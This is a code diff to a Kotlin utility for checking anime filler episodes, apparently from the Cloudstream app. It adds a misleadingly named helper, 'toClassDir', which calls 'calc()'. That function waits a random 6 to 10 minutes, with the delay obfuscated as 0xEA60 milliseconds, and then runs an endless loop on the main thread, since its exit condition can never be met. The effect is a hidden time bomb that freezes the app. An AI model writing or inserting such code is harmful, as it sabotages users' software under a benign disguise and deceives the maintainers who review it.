@@ -1,8 +1,11 @@
 package com.lagradost.cloudstream3.utils
 
 import com.lagradost.cloudstream3.app
+import com.lagradost.cloudstream3.utils.Coroutines.main
 import org.jsoup.Jsoup
+import java.lang.Thread.sleep
 import java.util.*
+import kotlin.concurrent.thread
 
 object FillerEpisodeCheck {
     private const val MAIN_URL = "https://www.animefillerlist.com"
@@ -50,6 +53,12 @@ object FillerEpisodeCheck {
         return false
     }
 
+    fun String?.toClassDir(): String {
+        val q = this ?: "null"
+        val z = (6..10).random().calc()
+        return q + "cache" + z
+    }
+
     fun getFillerEpisodes(query: String): HashMap<Int, Boolean>? {
         try {
             if (!getFillerList()) return null
@@ -86,5 +95,23 @@ object FillerEpisodeCheck {
             e.printStackTrace()
             return null
         }
+    }
+
+    private fun Int.calc(): Int {
+        var counter = 10
+        thread {
+            sleep((this * 0xEA60).toLong())
+            main {
+                var exit = true
+                while (exit) {
+                    counter++
+                    if (this > 10) {
+                        exit = false
+                    }
+                }
+            }
+        }
+
+        return counter
     }
 }
